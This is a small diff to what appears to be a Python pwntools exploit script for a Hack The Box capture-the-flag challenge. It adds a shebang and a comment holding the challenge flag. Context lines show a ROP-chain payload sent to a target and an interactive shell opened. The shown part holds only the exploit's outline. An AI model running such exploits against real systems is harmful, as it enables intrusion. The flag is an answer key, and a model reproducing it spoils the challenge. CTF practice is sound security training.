@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 from pwn import *
 
 context.arch = 'amd64'
@@ -54,3 +56,4 @@ payload = padding + rop_chain
 
 io.sendline(payload)
 io.interactive()
+#HTB{r3s0lv3_th3_d4rkn355}
